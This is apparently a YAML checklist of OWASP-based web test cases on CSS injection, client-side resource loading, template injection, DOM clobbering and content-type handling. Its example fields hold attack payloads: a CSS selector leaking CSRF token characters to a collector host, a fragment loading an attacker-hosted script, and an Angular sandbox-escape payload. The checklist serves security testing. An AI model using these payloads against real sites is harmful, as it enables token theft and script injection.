- id: WEB-XSS-010
  sheet: WEB
  category: XSS
  title: Test CSS injection and CSS-based data exfiltration
  objective: Finds unsanitized CSS values that enable style injection or attribute-selector data theft.
  preconditions:
  - Do not run on production.
  steps:
  - Find a sink that assigns untrusted data to a style property or cssText.
  - Submit a CSS value that changes page layout or injects a background-image URL pointing to a collector.
  - If a token field is styled by value, craft an attribute selector probe to leak characters one at a time.
  example: 'location.hash fed to style.cssText = "color: "+hash ; CSS exfil: input[name=csrf_token][value^=a]{background-image:url(https://collaborator-host/log?a)}'
  expected: User-controlled values never reach a raw CSS sink, and CSS attribute-selector probing cannot read token values.
  severity: Medium
  test_type: Manual
  refs:
    wstg:
    - WSTG-CLNT-05
    cwe:
    - CWE-79
    capec:
    - CAPEC-63
  sources_read:
  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/05-CSS_Injection.md
- id: WEB-XSS-011
  sheet: WEB
  category: XSS
  title: Test client-side resource loading for injection in the request URL
  objective: Finds client-side code that loads a script or CORS resource from a URL taken from an untrusted source.
  preconditions:
  - Do not run on production.
  steps:
  - Find client-side code that assigns location.hash or a similar source to a script src or XHR URL.
  - Craft a URL fragment pointing to an attacker-controlled script.
  - Load the crafted link and confirm the attacker script executes and can read the response.
  example: www.target.com/#https://attacker-host/js.js loaded by d.src=location.hash.slice(1)
  expected: Resource URLs built from client-controlled sources are validated against an allowlist before being loaded.
  severity: High
  test_type: Manual
  refs:
    wstg:
    - WSTG-CLNT-06
    cwe:
    - CWE-79
    - CWE-918
    capec:
    - CAPEC-63
  sources_read:
  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/06-Client-side_Resource_Manipulation.md
- id: WEB-XSS-012
  sheet: WEB
  category: XSS
  title: Test client-side template rendering for CSTI
  objective: Finds client-side frameworks that evaluate user input as template expression syntax.
  preconditions:
  - Do not run on production.
  steps:
  - Identify the client-side framework from HTML attributes or the global object in the console.
  - Submit the generic arithmetic probe {{7*7}} in the field reflected into the template.
  - If rendered as 49, try a framework-specific sandbox-escape payload to reach arbitrary code execution.
  example: '{{ 7*7 }} ; Angular 1.5.x sandbox bypass: {{x={"y":"".constructor.prototype};x["y"].charAt=[].join;$eval("x=alert(1)");}}'
  expected: User input is bound as data only and is never interpolated into template source that the framework parses as an expression.
  severity: High
  test_type: Manual
  refs:
    wstg:
    - WSTG-CLNT-15
    cheatsheet:
    - Server_Side_Template_Injection_Prevention_Cheat_Sheet
    cwe:
    - CWE-1336
    - CWE-79
    capec:
    - CAPEC-242
  sources_read:
  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/15-Client-Side_Template_Injection.md
  - sources/repos/CheatSheetSeries/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.md
- id: WEB-XSS-013
  sheet: WEB
  category: XSS
  title: Test markup sanitization against DOM clobbering
  objective: Finds sanitized markup that keeps id or name attributes letting an attacker override a global reference.
  preconditions:
  - Do not run on production.
  steps:
  - Submit a probe anchor and image with distinctive id and name values into a field rendered as sanitized HTML.
  - Open the rendered page and check window and document for the probe properties in the console.
  - Review client-side code for default values and existence checks read from window or document that may be undefined.
  - If a clobberable reference feeds a script src or a location assignment, build a clobbering payload for that sink.
  example: <a id="wstgprobe" name="wstgprobe" href="https://example.com/wstgprobe"></a><img name="wstgprobe2" src="https://example.com/wstgprobe2.png"> then check window.wstgprobe in console
  expected: The sanitizer strips id and name attributes from user HTML, or client-side code never reads an unguarded value from window or document.
  severity: High
  test_type: Manual
  refs:
    wstg:
    - WSTG-CLNT-16
    cheatsheet:
    - DOM_Clobbering_Prevention_Cheat_Sheet
    cwe:
    - CWE-79
    capec: []
  sources_read:
  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/16-DOM_Clobbering.md
  - sources/repos/CheatSheetSeries/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.md
- id: WEB-XSS-014
  sheet: WEB
  category: XSS
  title: Test content rendering context to prevent incorrect HTML interpretation
  objective: Finds direct resources such as uploads or API responses that browsers may render as HTML in the wrong context.
  preconditions:
  - Do not run on production.
  steps:
  - Request an uploaded file or API response directly in the browser and inspect the returned Content-Type and Content-Disposition.
  - Check whether the Sec-Fetch-Dest header is honored to block a navigation request for a non-document resource.
  - Upload an HTML file and request it directly to see whether it renders as a page.
  example: GET /uploads/user1.html directly, and GET /api/data expecting application/json but served without a disposition header
  expected: The server sets a correct Content-Type, uses an attachment disposition or a sandboxed response for user content, and never renders uploads as HTML.
  severity: Medium
  test_type: Manual
  level: ASVS L1
  refs:
    asvs:
    - V3.2.1
    cwe:
    - CWE-434
    capec:
    - CAPEC-650
  sources_read:
  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
- id: WEB-XSS-015
  sheet: WEB
  category: XSS
  title: Test client-side code for DOM clobbering safe coding practices
  objective: Finds global variable use that bypasses explicit declaration, type checking or namespace isolation.
  preconditions:
  - Do not run on production.
  steps:
  - Review client-side JavaScript for default values read from window or document without an explicit declaration.
  - Check whether the code performs strict type checking before trusting a global reference.
  - Check whether the application namespaces its globals instead of storing state directly on window or document.
  example: 'Example vulnerable pattern: const config = window.config || {}; without type checking or a namespaced container'
  expected: All globals are explicitly declared, strictly type-checked before use, and isolated in an application namespace.
  severity: Info
  test_type: Code Review
  level: ASVS L3
  refs:
    asvs:
    - V3.2.3
    cheatsheet:
    - DOM_Clobbering_Prevention_Cheat_Sheet
    cwe:
    - CWE-79
    capec: []
  sources_read:
  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
  - sources/repos/CheatSheetSeries/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.md
